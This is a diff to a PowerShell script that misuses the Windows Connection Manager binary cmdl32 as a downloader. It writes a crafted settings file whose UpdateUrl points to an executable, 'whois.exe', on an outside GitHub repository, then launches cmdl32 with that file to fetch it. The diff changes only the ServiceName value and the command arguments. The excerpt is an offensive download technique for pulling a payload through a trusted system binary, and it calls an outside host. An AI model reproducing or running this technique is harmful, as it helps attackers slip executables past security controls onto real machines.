@@ -16,7 +16,7 @@ Write-Host "[*] Creating VPN settings file"
 $settingsContent = @"
 [Connection Manager]
 CMSFile=settings.txt
-ServiceName=WindowsUpdate
+ServiceName=
 TunnelFile=settings.txt
 [Settings]
 UpdateUrl=https://raw.githubusercontent.com/fuzzlove/h4v0k/main/whois.exe
@@ -25,7 +25,7 @@ Set-Content -Path "$tempDir\settings.txt" -Value $settingsContent
 Write-Host "[*] Performing download with cmdl32"
 # Assuming cmdl32 is in system32 or accessible
 $cmdl32Path = "cmdl32"
-$arguments = "/vpn /lan `"$tempDir\settings.txt`""
+$arguments = "/vpn `"$tempDir\settings.txt`""
 try {
     Start-Process -FilePath $cmdl32Path -ArgumentList $arguments -NoNewWindow -Wait
     Write-Host "[*] Download complete with cmdl32."
